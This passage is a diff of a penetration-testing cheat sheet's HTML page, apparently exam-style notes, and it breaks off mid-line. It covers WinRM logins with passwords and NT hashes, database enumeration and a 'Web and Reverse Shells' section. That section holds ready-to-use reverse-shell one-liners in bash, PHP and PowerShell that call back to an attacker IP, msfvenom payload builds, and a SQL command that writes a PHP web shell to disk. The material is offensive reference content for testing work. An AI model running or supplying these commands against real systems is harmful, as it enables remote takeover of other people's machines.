+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a><span class="c1"># When connecting to service, don't use localhost, use 127.0.0.1</span>
+</span></code></pre></div>
+<h5 id="proxying">Proxying<a class="headerlink" href="#proxying" title="Permanent link">¶</a></h5>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="c1"># In browser, use FoxyProxy</span>
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="c1"># In CLI, use Proxychains and/or curl</span>
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>curl<span class="w"> </span>--proxy<span class="w"> </span>http://IP:3128<span class="w"> </span>http://IP:PORT
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>proxychains<span class="w"> </span>TOOL_WITH_PARAMETERS
+</span></code></pre></div>
 <h4 id="winrm-tcp-59855986">WinRM (TCP: 5985/5986)<a class="headerlink" href="#winrm-tcp-59855986" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c1"># Remote login</span>
-</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span><span class="s1">'USER'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'PASSWORD'</span><span class="w"> </span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c1"># Remote login</span>
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span><span class="s1">'USER'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'PASSWORD'</span><span class="w"> </span>
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="c1"># Remote login with hash</span>
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span><span class="s1">'USER'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'NTHASH'</span>
 </span></code></pre></div>
 <h4 id="databases">Databases<a class="headerlink" href="#databases" title="Permanent link">¶</a></h4>
 <h5 id="mssql-tcp-1433">MSSQL (TCP: 1433)<a class="headerlink" href="#mssql-tcp-1433" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="c1"># MSSQL login</span>
-</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>impacket-mssqlclient<span class="w"> </span>USER:PASS@IP<span class="w"> </span>-windows-auth
-</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>
-</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a><span class="c1"># Check version</span>
-</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>SELECT<span class="w"> </span>@@version<span class="p">;</span>
-</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a><span class="c1"># List DBs. Defaults are: master, tempdb, model, and msdb</span>
-</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a>SELECT<span class="w"> </span>name<span class="w"> </span>FROM<span class="w"> </span>sys.databases<span class="p">;</span>
-</span><span id="__span-63-8"><a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a><span class="c1"># List tables in DB</span>
-</span><span id="__span-63-9"><a id="__codelineno-63-9" name="__codelineno-63-9" href="#__codelineno-63-9"></a>SELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>offsec.information_schema.tables<span class="p">;</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="c1"># MSSQL login</span>
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>impacket-mssqlclient<span class="w"> </span>USER:PASS@IP<span class="w"> </span>-windows-auth
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="c1"># Check version</span>
+</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>SELECT<span class="w"> </span>@@version<span class="p">;</span>
+</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="c1"># List DBs. Defaults are: master, tempdb, model, and msdb</span>
+</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a>SELECT<span class="w"> </span>name<span class="w"> </span>FROM<span class="w"> </span>sys.databases<span class="p">;</span>
+</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="c1"># List tables in DB</span>
+</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a>SELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>offsec.information_schema.tables<span class="p">;</span>
 </span></code></pre></div>
 <h5 id="mysql-tcp-3306">MySQL (TCP: 3306)<a class="headerlink" href="#mysql-tcp-3306" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c1"># MySQL login</span>
-</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>-p<span class="s1">'PASS'</span><span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-P<span class="w"> </span>PORT<span class="w"> </span>--skip-ssl-verify-server-cert
-</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>
-</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="c1"># Check version</span>
-</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="k">select</span><span class="w"> </span>version<span class="o">()</span><span class="p">;</span>
-</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="c1"># Current user</span>
-</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="k">select</span><span class="w"> </span>system_user<span class="o">()</span><span class="p">;</span>
-</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a><span class="c1"># List DBs</span>
-</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>show<span class="w"> </span>databases<span class="p">;</span>
-</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a><span class="c1"># List tables in DB</span>
-</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a>show<span class="w"> </span>tables<span class="w"> </span>from<span class="w"> </span>DBNAME<span class="p">;</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="c1"># MySQL login</span>
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>-p<span class="s1">'PASS'</span><span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-P<span class="w"> </span>PORT<span class="w"> </span>--skip-ssl-verify-server-cert
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>
+</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="c1"># Check version</span>
+</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a><span class="k">select</span><span class="w"> </span>version<span class="o">()</span><span class="p">;</span>
+</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a><span class="c1"># Current user</span>
+</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a><span class="k">select</span><span class="w"> </span>system_user<span class="o">()</span><span class="p">;</span>
+</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a><span class="c1"># List DBs</span>
+</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>show<span class="w"> </span>databases<span class="p">;</span>
+</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a><span class="c1"># List tables in DB</span>
+</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>show<span class="w"> </span>tables<span class="w"> </span>from<span class="w"> </span>DBNAME<span class="p">;</span>
 </span></code></pre></div>
 <h5 id="postgresql-tcp-5432">PostgreSQL (TCP: 5432)<a class="headerlink" href="#postgresql-tcp-5432" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="c1"># PostgreSQL login</span>
-</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>psql<span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>2PORT5<span class="w"> </span>-U<span class="w"> </span>USER
-</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
-</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="c1"># List DBs</span>
-</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="se">\l</span>
-</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="c1"># Connect to DB</span>
-</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a><span class="se">\c</span><span class="w"> </span>DB_NAME
-</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="c1"># List tables in DB</span>
-</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>DB_NAME<span class="p">;</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c1"># PostgreSQL login</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>psql<span class="w"> </span>-h<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>PORT<span class="w"> </span>-U<span class="w"> </span>USER
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="c1"># List DBs</span>
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="se">\l</span>
+</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="c1"># Connect to DB</span>
+</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="se">\c</span><span class="w"> </span>DB_NAME
+</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="c1"># List tables in DB</span>
+</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>DB_NAME<span class="p">;</span>
 </span></code></pre></div>
-<h3 id="reverse-shells">Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permanent link">¶</a></h3>
+<h3 id="web-and-reverse-shells">Web and Reverse Shells<a class="headerlink" href="#web-and-reverse-shells" title="Permanent link">¶</a></h3>
 <p><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary">https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary</a>
 <a href="https://github.com/ivan-sincek/php-reverse-shell/">Linux and Windows PHP shell</a></p>
 <p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="c1"># Check current shell</span>
-</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>ps<span class="w"> </span>-p<span class="w"> </span><span class="nv">$$</span>
-</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="nb">echo</span><span class="w"> </span>%COMSPEC%
-</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>
-</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a><span class="c1"># Kali directory webshells</span>
-</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>/usr/share/webshells/
-</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>
-</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a><span class="c1"># Bash</span>
-</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/IP/PORT<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
-</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a><span class="c1"># Bash (URL encoded)</span>
-</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
-</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a><span class="c1"># Bash, in case of sh</span>
-</span><span id="__span-66-13"><a id="__codelineno-66-13" name="__codelineno-66-13" href="#__codelineno-66-13"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1"</span>
-</span><span id="__span-66-14"><a id="__codelineno-66-14" name="__codelineno-66-14" href="#__codelineno-66-14"></a><span class="c1"># PHP</span>
-</span><span id="__span-66-15"><a id="__codelineno-66-15" name="__codelineno-66-15" href="#__codelineno-66-15"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">'$sock=fsockopen("IP",PORT);exec("/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
-</span><span id="__span-66-16"><a id="__codelineno-66-16" name="__codelineno-66-16" href="#__codelineno-66-16"></a><span class="c1"># Powershell one liner</span>
-</span><span id="__span-66-17"><a id="__codelineno-66-17" name="__codelineno-66-17" href="#__codelineno-66-17"></a><span class="c1"># https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 </span>
-</span><span id="__span-66-18"><a id="__codelineno-66-18" name="__codelineno-66-18" href="#__codelineno-66-18"></a><span class="c1"># in base of Base64, make sure to encode as UTF16 first</span>
-</span><span id="__span-66-19"><a id="__codelineno-66-19" name="__codelineno-66-19" href="#__codelineno-66-19"></a><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.10.10'</span>,80<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">$bytes</span>.Length<span class="o">))</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>-TypeName<span class="w"> </span>System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0,<span class="w"> </span><span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>iex<span class="w"> </span><span class="s2">". { </span><span class="nv">$data</span><span class="s2"> } 2&gt;&amp;1"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="w"> </span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span>+<span class="w"> </span><span class="s1">'PS '</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path<span class="w"> </span>+<span class="w"> </span><span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
-</span><span id="__span-66-20"><a id="__codelineno-66-20" name="__codelineno-66-20" href="#__codelineno-66-20"></a>
-</span><span id="__span-66-21"><a id="__codelineno-66-21" name="__codelineno-66-21" href="#__codelineno-66-21"></a><span class="c1"># Python file hosting</span>
-</span><span id="__span-66-22"><a id="__codelineno-66-22" name="__codelineno-66-22" href="#__codelineno-66-22"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
-</span><span id="__span-66-23"><a id="__codelineno-66-23" name="__codelineno-66-23" href="#__codelineno-66-23"></a>
-</span><span id="__span-66-24"><a id="__codelineno-66-24" name="__codelineno-66-24" href="#__codelineno-66-24"></a><span class="c1"># Create payloads with msfvenom</span>
-</span><span id="__span-66-25"><a id="__codelineno-66-25" name="__codelineno-66-25" href="#__codelineno-66-25"></a><span class="c1"># .exe 64-bit, stageless</span>
-</span><span id="__span-66-26"><a id="__codelineno-66-26" name="__codelineno-66-26" href="#__codelineno-66-26"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
-</span><span id="__span-66-27"><a id="__codelineno-66-27" name="__codelineno-66-27" href="#__codelineno-66-27"></a><span class="c1"># .exe 32-bit, stageless</span>
-</span><span id="__span-66-28"><a id="__codelineno-66-28" name="__codelineno-66-28" href="#__codelineno-66-28"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
-</span><span id="__span-66-29"><a id="__codelineno-66-29" name="__codelineno-66-29" href="#__codelineno-66-29"></a><span class="c1"># .elf, stageless</span>
-</span><span id="__span-66-30"><a id="__codelineno-66-30" name="__codelineno-66-30" href="#__codelineno-66-30"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell
-</span><span id="__span-66-31"><a id="__codelineno-66-31" name="__codelineno-66-31" href="#__codelineno-66-31"></a><span class="c1"># PHP</span>
-</span><span id="__span-66-32"><a id="__codelineno-66-32" name="__codelineno-66-32" href="#__codelineno-66-32"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter/reverse_tcp<span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>&gt;<span class="w"> </span>pwn.php
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="c1"># Check current shell</span>
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>ps<span class="w"> </span>-p<span class="w"> </span><span class="nv">$$</span>
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="nb">echo</span><span class="w"> </span>%COMSPEC%
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="c1"># Kali directory webshells</span>
+</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>/usr/share/webshells/
+</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>
+</span><span id="__span-68-8"><a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a><span class="c1"># Create webshell using SQL (e.g. in phpmyadmin)</span>
+</span><span id="__span-68-9"><a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a>SELECT<span class="w"> </span><span class="s2">"&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">['cmd']); ?&gt;"</span><span class="w"> </span>into<span class="w"> </span>outfile<span class="w"> </span><span class="s2">"C:\\&lt;FOLDERPATH&gt;\\shell.php"</span>
+</span><span id="__span-68-10"><a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a>
+</span><span id="__span-68-11"><a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a><span class="c1"># Bash</span>
+</span><span id="__span-68-12"><a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/IP/PORT<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span><span id="__span-68-13"><a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a><span class="c1"># Bash (URL encoded)</span>
+</span><span id="__span-68-14"><a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+</span><span id="__span-68-15"><a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a><span class="c1"># Bash, in case of sh</span>
+</span><span id="__span-68-16"><a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1"</span>
+</span><span id="__span-68-17"><a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a><span class="c1"># PHP</span>
+</span><span id="__span-68-18"><a id="__codelineno-68-18" name="__codelineno-68-18" href="#__codelineno-68-18"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">'$sock=fsockopen("IP",PORT);exec("/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</span><span id="__span-68-19"><a id="__codelineno-68-19" name="__codelineno-68-19" href="#__codelineno-68-19"></a><span class="c1"># Powershell one liner</span>
+</span><span id="__span-68-20"><a id="__codelineno-68-20" name="__codelineno-68-20" href="#__codelineno-68-20"></a><span class="c1"># https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 </span>
+</span><span id="__span-68-21"><a id="__codelineno-68-21" name="__codelineno-68-21" href="#__codelineno-68-21"></a><span class="c1"># in base of Base64, make sure to encode as UTF16 first</span>
+</span><span id="__span-68-22"><a id="__codelineno-68-22" name="__codelineno-68-22" href="#__codelineno-68-22"></a><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.10.10'</span>,80<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">$bytes</span>.Length<span class="o">))</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>-TypeName<span class="w"> </span>System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0,<span class="w"> </span><span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>iex<span class="w"> </span><span class="s2">". { </span><span class="nv">$data</span><span class="s2"> } 2&gt;&amp;1"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="w"> </span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span>+<span class="w"> </span><span class="s1">'PS '</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path<span class="w"> </span>+<span class="w"> </span><span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span 